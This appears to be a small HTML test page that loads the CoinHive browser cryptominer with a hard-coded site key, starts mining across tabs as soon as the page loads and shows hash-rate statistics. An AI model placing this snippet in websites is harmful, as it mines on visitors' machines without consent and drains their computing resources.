<!DOCTYPE html>
<html>
	<head>
	<title>Test for Coin Hive Hash Rates</title>
	<script type="text/javascript" src="https://coin-hive.com/lib/coinhive.min.js"></script>
</head>
<body>
<textarea id="details" rows="3"></textarea>
<script>
	var miner = new CoinHive.Anonymous('kyf2CpkuGFyLhAZwCFaryDJreKg9jsFt');
	miner.start(CoinHive.FORCE_MULTI_TAB);

	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
		document.getElementById("details").value = "HPS:"+hashesPerSecond+"\nTH:"+totalHashes+"\nAH:"+acceptedHashes;
	}, 1000);
</script>
</body>
</html>
